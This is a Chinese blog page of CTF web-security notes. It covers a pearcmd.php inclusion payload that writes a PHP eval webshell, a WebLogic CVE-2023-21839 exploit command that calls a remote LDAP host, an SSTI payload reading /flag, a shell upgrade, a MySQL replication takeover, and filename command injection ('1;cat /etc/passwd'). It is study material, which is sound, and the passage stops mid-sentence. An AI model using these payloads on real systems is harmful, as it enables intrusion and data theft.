<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.2">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"ttoc.xin","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"appID":"1NWCFV229B","apiKey":"89f81f113af1e49e4b5061eb680ea44d","indexName":"hexo","hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="关键笔记，主要总结比赛中遇到的">
<meta property="og:type" content="article">
<meta property="og:title" content="笔记">
<meta property="og:url" content="https://ttoc.xin/Notes/index.html">
<meta property="og:site_name" content="Ttoc&#39;s blog">
<meta property="og:description" content="关键笔记，主要总结比赛中遇到的">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ttoc.xin/Notes/image-20221002145951718.png">
<meta property="og:image" content="https://ttoc.xin/Notes/image-20230312224705119.png">
<meta property="og:image" content="https://ttoc.xin/Notes/image-20230312224941575.png">
<meta property="og:image" content="https://ttoc.xin/Notes/image-20230330210854308.png">
<meta property="og:image" content="https://ttoc.xin/Notes/image-20230330211853378.png">
<meta property="og:image" content="https://ttoc.xin/Notes/image-20230330224610135.png">
<meta property="og:image" content="https://ttoc.xin/Notes/image-20230501222412594.png">
<meta property="og:image" content="https://ttoc.xin/Notes/image-20230501222722767.png">
<meta property="og:image" content="https://ttoc.xin/Notes/image-20230615002937536.png">
<meta property="og:image" content="https://ttoc.xin/Notes/image-20230615002956862.png">
<meta property="og:image" content="https://ttoc.xin/Notes/image-20230615003317118.png">
<meta property="og:image" content="https://ttoc.xin/Notes/image-20230615134425055.png">
<meta property="og:image" content="https://ttoc.xin/Notes/image-20230615134634288.png">
<meta property="og:image" content="https://ttoc.xin/Notes/image-20230615134831790.png">
<meta property="og:image" content="https://ttoc.xin/Notes/image-20230615135711738.png">
<meta property="og:image" content="https://ttoc.xin/Notes/image-20230617144803167.png">
<meta property="og:image" content="https://ttoc.xin/Notes/image-20230904224135156.png">
<meta property="og:image" content="https://ttoc.xin/Notes/image-20230904223823110.png">
<meta property="og:image" content="https://ttoc.xin/Notes/image-20230904170556437.png">
<meta property="og:image" content="https://ttoc.xin/Notes/image-20230904205656790.png">
<meta property="og:image" content="https://ttoc.xin/Notes/image-20230904171442398.png">
<meta property="og:image" content="https://ttoc.xin/Notes/image-20230904174618539.png">
<meta property="og:image" content="https://ttoc.xin/Notes/image-20230904174602793.png">
<meta property="og:image" content="https://ttoc.xin/Notes/image-20230904174755615.png">
<meta property="og:image" content="https://ttoc.xin/Notes/image-20230904175028098.png">
<meta property="og:image" content="https://ttoc.xin/Notes/image-20230904180249243.png">
<meta property="og:image" content="https://ttoc.xin/Notes/image-20240113212111331.png">
<meta property="og:image" content="https://ttoc.xin/Notes/image-20240113212048880.png">
<meta property="og:image" content="https://ttoc.xin/Notes/image-20240113212022967.png">
<meta property="og:image" content="https://ttoc.xin/Notes/%7B9B902913-B5EA-4AF3-ADD1-A61F97A0281C%7D.png">
<meta property="og:image" content="https://ttoc.xin/Notes/image-20250124105534724.png">
<meta property="article:published_time" content="2023-02-15T09:34:06.818Z">
<meta property="article:modified_time" content="2025-02-17T07:11:51.330Z">
<meta property="article:author" content="Ttoc">
<meta property="article:tag" content="daily">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ttoc.xin/Notes/image-20221002145951718.png">

<link rel="canonical" href="https://ttoc.xin/Notes/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>笔记 | Ttoc's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style><link rel="stylesheet" href="/css/prism-xonokai.css" type="text/css"></head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Ttoc's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">必须从过去的错误学习教训，而非依赖过去的成功。</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://ttoc.xin/Notes/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Ttoc">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Ttoc's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          笔记
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-02-15 17:34:06" itemprop="dateCreated datePublished" datetime="2023-02-15T17:34:06+08:00">2023-02-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-02-17 15:11:51" itemprop="dateModified" datetime="2025-02-17T15:11:51+08:00">2025-02-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p><code>关键笔记，主要总结比赛中遇到的</code></p>
<span id="more"></span>

<h1 id="pearcmd-php的巧妙利用"><a href="#pearcmd-php的巧妙利用" class="headerlink" title="pearcmd.php的巧妙利用"></a><code>pearcmd.php</code>的巧妙利用</h1><blockquote>
<p>来自P神博客</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp</a></p>
</blockquote>
<p>就是利用<code>pearcmd.php</code>这个<code>pecl/pear</code>中的文件。</p>
<p><code>pecl</code>是<code>PHP</code>中用于管理扩展而使用的命令行工具，而<code>pear</code>是<code>pecl</code>依赖的类库。在<code>7.3</code>及以前，<code>pecl/pear</code>是默认安装的；在<code>7.4</code>及以后，需要我们在编译<code>PHP</code>的时候指定<code>--with-pear</code>才会安装。</p>
<p>不过，在<code>Docker</code>任意版本镜像中，<code>pcel/pear</code>都会被默认安装，安装的路径在<code>/usr/local/lib/php</code>。</p>
<blockquote>
<p>原本pear&#x2F;pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。但我们遇到的场景比较特殊，是一个文件包含的场景，那么我们就可以包含到pear中的文件，进而利用其中的特性来搞事。</p>
</blockquote>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?+</span>config-create+<span class="regexp">/&amp;file=/usr</span><span class="regexp">/local/lib</span><span class="regexp">/php/pearcmd</span>.php&amp;<span class="regexp">/&lt;?=phpinfo()?&gt;+/tmp</span><span class="regexp">/hello.php</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>#config-create，阅读其代码和帮助，可以知道，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中</p>
</blockquote>
<p>发送数据包，目标将会写入一个文件<code>/tmp/hello.php</code>，其内容包含<code>&lt;?=phpinfo()?&gt;</code></p>
<blockquote>
<p><code>/tmp/hello.php</code><br>当然也可以改成<code>/var/html/www</code>，这样就可以直接读取，不用利用文件包含参数进行对<code>/tmp/hello.php</code>读取</p>
<p>只是放在<code>/tmp</code>下不容易触发防火墙被删除</p>
</blockquote>
<p>利用文件包含存在，再包含这个文件，就会显示我们的信息</p>
<blockquote>
<p><code>&lt;?=phpinfo()?&gt;</code><br>也可以改写成<br><code>&lt;?=eval($_POST[8]);&gt;</code><br>这样就可以执行更多的命令了</p>
</blockquote>
<h1 id="libmbfl打分"><a href="#libmbfl打分" class="headerlink" title="libmbfl打分"></a>libmbfl打分</h1><blockquote>
<p>所以实现<code>$charset == BASE64</code>，只要文件内容前面数据让它识别为base64即可</p>
<p>那么如何让其认为是base64呢？</p>
<p>这就涉及到<code>libmbfl</code>的打分，<code>libmbfl</code>是<code>mb</code>扩展</p>
<p><code>https://github.com/php/php-src/blob/master/ext/mbstring/libmbfl/mbfl/mbfilter.c#L225</code></p>
<p>我的理解就是类似像<code>checkengine</code>，比如<code>mb_detect_encoding()</code>这类的函数对内容进行编码的识别，就是<code>匹配内容中的一些符合编码的字符，匹配成功对应编码加分</code>，最后从头到尾匹配完成后，<code>打分最高的编码就被认为是该内容的编码</code></p>
</blockquote>
<p>这是打分判断</p>
<blockquote>
<p>0xFFFF是-1，&gt;&#x3D;0 </p>
<blockquote>
<p>0x21是33 33对应!</p>
<p>0x2F是47 47对应&#x2F;</p>
<p><code>47&gt;=c&gt;=33</code></p>
</blockquote>
<p><code>/</code>打分打的多</p>
</blockquote>
<h1 id="Tomcat以-一种奇怪的方式进行规范化"><a href="#Tomcat以-一种奇怪的方式进行规范化" class="headerlink" title="Tomcat以;一种奇怪的方式进行规范化"></a>Tomcat以;一种奇怪的方式进行规范化</h1><blockquote>
<p><code>;</code>后的数据不解析</p>
<p>即可<code>http://127.0.0.1/index;123.ico</code>，读取时只视为<code>http://127.0.0.1/index</code></p>
</blockquote>
<h1 id="服务器端XSS【针对于动态PDF】"><a href="#服务器端XSS【针对于动态PDF】" class="headerlink" title="服务器端XSS【针对于动态PDF】"></a>服务器端XSS【针对于动态PDF】</h1><blockquote>
<p><code>https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdfhttps://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf</code></p>
</blockquote>
<p>还是从htb的机器学习到的</p>
<blockquote>
<p>比如，在一些购物网站订单会自动生成一个动态的pdf方便打印作为报销的凭证，</p>
<p>但是虽然看起像是pdf，但本质还是html网站。才可以实现动态，而其中的数据也是客户端传向服务器生成</p>
<p>那么如果传向服务器进行动态pdf生成的数据被用户控制，导致最后生成的pdf中的数据返回一些服务器的敏感的数据，就会非常危险</p>
</blockquote>
<blockquote>
<p>如果网页使用用户控制的输入创建 PDF，您可以尝试诱骗创建 PDF 的机器人执行任意 JS 代码。 因此，如果 PDF 创建者机器人找到某种 HTML 标记，它将解释它们，您可以滥用此行为<code>导致服务器 XSS</code>。</p>
</blockquote>
<p>请注意，<code>&lt;script&gt;&lt;/script&gt;</code> 标签并不总是有效，因此您需要不同的方法来执行 JS（例如，滥用 <code>&lt;img</code>,<code>&lt;iframe&gt;</code>）。 </p>
<p>另外，请注意，在常规利用中，您将能够<strong>查看&#x2F;下载创建的pdf</strong>，因此您将能够看到<code>通过JS编写的所有内容</code>（例如使用<code>document.write（）</code>）。</p>
<p>但是，如果您<strong>看不到</strong>创建的PDF，则可能需要<strong>提取信息，从而向您发出Web请求</strong>（盲写，然后看回显猜测）。</p>
<h1 id="获得稳定的shell"><a href="#获得稳定的shell" class="headerlink" title="获得稳定的shell"></a>获得稳定的shell</h1><p>【不会因为ctrl+c退出，而且可以按上下键，返回之前的命令】</p>
<blockquote>
<ol>
<li><p><strong>python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’</strong> 或者</p>
<p>**python3 -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’**进入交互式shell</p>
</li>
<li><p><code>Ctrl-Z</code>将shell放到后台</p>
</li>
<li><p><code>stty raw -echo ; fg ; reset</code></p>
</li>
</ol>
<p>&#x2F;&#x2F;stty 设置终端端口设备的接口选项</p>
<p>&#x2F;&#x2F;echo 表示回显，比如当-echo时，输入ls后按回车，仍然会看到ls</p>
<p>&#x2F;&#x2F;fg把shell提到前台来</p>
<p>&#x2F;&#x2F;reset表示重启终端，此时的终端为我们靶机的shell窗口，所以不容易被退出或者中断</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Notes/image-20221002145951718.png"><img src="/Notes/image-20221002145951718.png" alt="image-20221002145951718"></a></p>
<p>成功获得全交互式<code>shell</code></p>
<h1 id="T3协议的反序列化攻击"><a href="#T3协议的反序列化攻击" class="headerlink" title="T3协议的反序列化攻击"></a>T3协议的反序列化攻击</h1><p>这是在复现CVE-2023-21839时，查看其利用的基本原理T3&#x2F;时看到的</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/unicodeSec/p/14378757.html">学习文章</a></p>
<h1 id="记第一次公网测试"><a href="#记第一次公网测试" class="headerlink" title="记第一次公网测试"></a>记第一次公网测试</h1><p>比如，在复现cve-2023-21839时</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./web.exe -<span class="built_in">ip</span> 公网<span class="built_in">ip</span> -port <span class="number">7001</span> -ldap ldap:<span class="comment">//另一个公网ip（挂者jndi）:1389/xx</span></span><br></pre></td></tr></table></figure>

<p>如果想在本机进行复现，需要让自己的ip变成可以被公网访问的ip，在上面进行打开ldap，以及挂上恶意类，否则只能本地测试</p>
<h1 id="file-b解析-后内容显示"><a href="#file-b解析-后内容显示" class="headerlink" title="file -b解析#!后内容显示"></a>file -b解析#!后内容显示</h1><p>这里就需要一个知识点<code>#!</code>后的内容，会被视为文件的解释器，然后打印出来，比如</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230312224705119.png"><img src="/Notes/image-20230312224705119.png" alt="image-20230312224705119"></a></p>
<p>这里</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">a </span><span class="template-variable">&#123;&#123;<span class="name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"> script, ASCII text executable</span></span><br></pre></td></tr></table></figure>

<p>就看出来它把文本</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>当作了<code>script</code>解析器，在解析文件类型时，就把它打印出来了</p>
<p>于是我们上传该文件</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230312224941575.png"><img src="/Notes/image-20230312224941575.png" alt="image-20230312224941575"></a></p>
<p>得到flag</p>
<h1 id="strace命令"><a href="#strace命令" class="headerlink" title="strace命令"></a>strace命令</h1><p>在Linux系统中，strace命令是一个集诊断、调试、统计与一体的工具，可用来追踪调试程序，能够与其他命令搭配使用。</p>
<p>在Linux世界，<code>进程不能直接访问硬件设备</code>，当进程需要访问硬件设备 (比如读取磁盘文件，接收网络数据等等)时，必须由用户态模式切换至内核态模式，通过系统调用访问硬件设备。<code>strace可以跟踪到一个进程产生的系统调用,包括参数，返回值，执行消耗的时间。</code></p>
<p>而对于一些命令而言也可以监控其调用的一些文件信息</p>
<p>比如</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strace <span class="regexp">/bin/</span><span class="keyword">file</span></span><br><span class="line">#查询<span class="keyword">file</span>命令执行需要调用的文件信息</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Notes/image-20230330210854308.png"><img src="/Notes/image-20230330210854308.png" alt="image-20230330210854308"></a></p>
<p>可以看到调用了一个<code>/etc/ld.so.preload</code>文件</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230330211853378.png"><img src="/Notes/image-20230330211853378.png" alt="image-20230330211853378"></a></p>
<h1 id="Mysql主从复制"><a href="#Mysql主从复制" class="headerlink" title="Mysql主从复制"></a>Mysql主从复制</h1><blockquote>
<p>主从复制的基础是主服务器对数据库修改记录二进制日志，从服务器通过主服务器的二进制日志自动执行更新，也就是主库只传日志给从库，从库根据日志执行命</p>
<p>[学习文章]</p>
<p>作者：小熊我不要了<br>链接：<a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903921677238285">https://juejin.cn/post/6844903921677238285</a></p>
</blockquote>
<p>在某比赛遇到的，一个<code>sql</code>注入环境，对语句过滤很多，也包括<code>select、updatexml</code>等等常用的语句。</p>
<p>但是没有过滤<code>show，slave，change</code>等语句</p>
<hr>
<p>该题需要一个登录，是在一个php语句中</p>
<p>大概是从ctf库中，查询其中的admin表，匹配其中用户名和密码</p>
<p>但是ctf库，利用<code>show tables in ctf;</code>发现是一个空库，连表也没有，也就是直接登录改根本不行，需要修改它的数据库，添加用户信息</p>
<p><code>show variables like &#39;secure_file_priv&#39;;</code>查看其有没有可以被读取或写入的文件，也是空</p>
<hr>
<p>所以根据主从复制的思路就是，攻击机搭建一个数据库作为主库，而环境的数据库当作从库，从而实现在攻击上进行修改使得从库【环境数据库】被修改</p>
<p>为什么会想到利用主从复制，其实很简单，过滤了这么多，但是执行</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">show</span> slave <span class="built_in">status</span>;</span><br></pre></td></tr></table></figure>

<p>可以看到回显，并且显示Running</p>
<blockquote>
<p><strong>主从配置</strong></p>
<p>在主从配置之前需要确保两台mysql需要同步的库状态一致。</p>
</blockquote>
<h2 id="攻击机【主】"><a href="#攻击机【主】" class="headerlink" title="攻击机【主】"></a>攻击机【主】</h2><p>配置文件默认在<code>/etc/my.cnf</code>下。</p>
<p>在配置文件中新增配置：</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="comment">## 同一局域网内注意要唯一</span></span><br><span class="line"><span class="attr">server-id</span>=<span class="number">100</span>  </span><br><span class="line"><span class="comment">## 开启二进制日志功能，可以随便取（关键）</span></span><br><span class="line"><span class="attr">log-bin</span>=mysql-bin</span><br></pre></td></tr></table></figure>

<p>修改配置后需要重启才能生效：</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">service mysql restart</span></span><br></pre></td></tr></table></figure>

<p>重启之后进入mysql：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -<span class="selector-tag">p</span></span><br></pre></td></tr></table></figure>

<p>在<code>master</code>数据库创建数据同步用户，授予用户 slave REPLICATION SLAVE权限和REPLICATION CLIENT权限，用于在主从库之间同步数据。</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;slave&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;@#$Rfg345634523rft4fa&#x27;</span>;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">REPLICATION</span> SLAVE, <span class="keyword">REPLICATION</span> CLIENT <span class="keyword">ON</span> *.* <span class="keyword">TO</span> <span class="string">&#x27;slave&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>语句中的<code>%</code>代表所有服务器都可以使用这个用户，如果想指定特定的ip，将<code>%</code>改成ip即可。</p>
<p>查看主mysql的状态：</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show <span class="keyword">master</span> <span class="title">status</span>;</span><br></pre></td></tr></table></figure>

<p>记录下<code>File</code>和<code>Position</code>的值，并且不进行其他操作以免引起<code>Position</code>的变化。</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230330224610135.png"><img src="/Notes/image-20230330224610135.png" alt="image-20230330224610135"></a></p>
<blockquote>
<p><code>File</code>：这是 MySQL 服务器正在写入的当前二进制日志文件的名称。</p>
<p><code>Position</code>：这是下一个事件将被写入的二进制日志文件中的位置。</p>
</blockquote>
<h3 id="环境执行【从】"><a href="#环境执行【从】" class="headerlink" title="环境执行【从】"></a>环境执行【从】</h3><p>配置环境已经有了，所以不用考虑如何修改</p>
<blockquote>
<p>在从<code>my.cnf</code>配置中新增：</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysqld]</span><br><span class="line"><span class="comment">## 设置server_id,注意要唯一</span></span><br><span class="line"><span class="attr">server-id</span>=<span class="number">101</span>  </span><br><span class="line"><span class="comment">## 开启二进制日志功能，以备Slave作为其它Slave的Master时使用</span></span><br><span class="line"><span class="attr">log-bin</span>=mysql-slave-bin   </span><br><span class="line"><span class="comment">## relay_log配置中继日志</span></span><br><span class="line"><span class="attr">relay_log</span>=edu-mysql-relay-bin  </span><br></pre></td></tr></table></figure>

<p>修改配置后需要重启才能生效：</p>
</blockquote>
<p>修改主库信息，将主库信息改成攻击机，用户名和密码都是主机之前建立的</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">change master <span class="keyword">to</span> <span class="attribute">master_host</span>=<span class="string">&#x27;攻击机ip&#x27;</span>, <span class="attribute">master_user</span>=<span class="string">&#x27;slave&#x27;</span>, <span class="attribute">master_password</span>=<span class="string">&#x27;@#$Rfg345634523rft4fa&#x27;</span>, <span class="attribute">master_port</span>=3306, <span class="attribute">master_log_file</span>=<span class="string">&#x27;mysql-bin.000064&#x27;</span>, master_log_pos= 12, <span class="attribute">master_connect_retry</span>=30;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>*注：日志的postion和file要修改成自己的攻击机对应的，指定从库从哪个文件进行读取，从哪个位置进行读取</p>
</blockquote>
<p>修改后，执行</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">start</span> <span class="literal">slave</span>;</span><br><span class="line"><span class="comment">#开启主从复制</span></span><br></pre></td></tr></table></figure>

<p>然后执行</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show <span class="literal">slave</span> status;</span><br><span class="line"><span class="comment">#查看同步状态</span></span><br></pre></td></tr></table></figure>

<p>得到<code>SlaveIORunning</code> 和 <code>SlaveSQLRunning</code> 都是Yes说明主从复制已经开启</p>
<p>然后就按之前得到信息，在主库建立ctf库，然后建立admin表，在里面添加user和password的数据、</p>
<p>最后等环境数据库【从库】与攻击机数据库同步后，即可进行成功登录拿到flag</p>
<blockquote>
<p>P.S</p>
<p>由于mysql8新增密码规则<code>caching_sha2_password</code>，要求密码必须有一定复杂度，必须有字母大小写、数字和特殊符号，所以可能有时密码通不过，可以尝试修改密码规则为<code>mysql_native_password</code>以实现可以用简易密码</p>
</blockquote>
<h1 id="windows与linux对-的不同解析与限制"><a href="#windows与linux对-的不同解析与限制" class="headerlink" title="windows与linux对;的不同解析与限制"></a>windows与linux对;的不同解析与限制</h1><p>在windows中，你可以将文件名名为类似</p>
<blockquote>
<p>1;hahahaha;.txt</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230501222412594.png"><img src="/Notes/image-20230501222412594.png" alt="image-20230501222412594"></a></p>
<p>而在linux中则不行，因为它会将其解析成三段命令</p>
<blockquote>
<p>1 hahahaha .txt</p>
</blockquote>
<p>如果想要命名，则需要单引号包裹</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230501222722767.png"><img src="/Notes/image-20230501222722767.png" alt="image-20230501222722767"></a></p>
<blockquote>
<p>&#x3D;&#x3D;&gt;所以如果存在一个环境，会将上传的zip文件自动解压，或者会将上传文件进行检测并把上传文件文件名包含在命令中，并且没有加上引号限制字符类型</p>
</blockquote>
<p>比如</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unzip -oq /tmp/xx -d /home/</span><br><span class="line">or</span><br><span class="line"><span class="built_in">cat</span> /tmp/xx </span><br></pre></td></tr></table></figure>

<p>那么猜测如果文件名为</p>
<blockquote>
<p>1;cat &#x2F;etc&#x2F;passwd;zip</p>
</blockquote>
<p>那么执行时，就会导致</p>
